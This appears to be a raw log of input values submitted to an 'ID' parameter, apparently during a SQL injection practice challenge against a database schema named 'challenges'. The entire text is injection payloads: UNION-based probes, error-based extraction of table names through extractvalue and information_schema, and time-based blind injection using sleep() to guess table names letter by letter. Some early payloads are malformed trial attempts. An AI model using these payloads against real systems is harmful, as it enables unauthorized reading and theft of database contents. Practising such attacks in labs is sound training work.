ID:1
ID:10
ID:-1' union select 1,2,3 -- 
ID:1'
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') union select 1,2,extractvalue(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,0x7e)) #
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0)
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0)
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0)
ID:1') and  if(left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ),sleep(3),0) #
ID:1') and if(left( select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ,sleep(3),0) #
ID:1') and if(left( select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ,1) = 's' ,sleep(3),0) #
ID:1') and if( left(database(),1) = 'b' ,sleep(3),0) #
ID:1') and if( left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,1) = 'b' ,sleep(3),0) #
ID:1') and if( left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,1) = 'b' ,sleep(3),0) #
ID:1') and if( left( (select group_concat(table_name) from information_schema.tables where table_schema = 'challenges' ) ,1) = 'Y' ,sleep(3),0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'a') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'b') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'c') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'd') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'e') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'f') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'g') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'h') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'i') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'j') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'k') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'l') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'm') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'n') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'o') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'p') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'q') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'r') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 's') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 't') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'u') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'v') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'w') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'x') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'y') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ya') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yb') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yc') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yd') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ye') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yf') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yg') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yh') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yi') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yj') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yk') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yl') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ym') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yn') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yo') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yp') , sleep(5) , 0) #
ID:1') and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'yq') , sleep(5) , 0) #
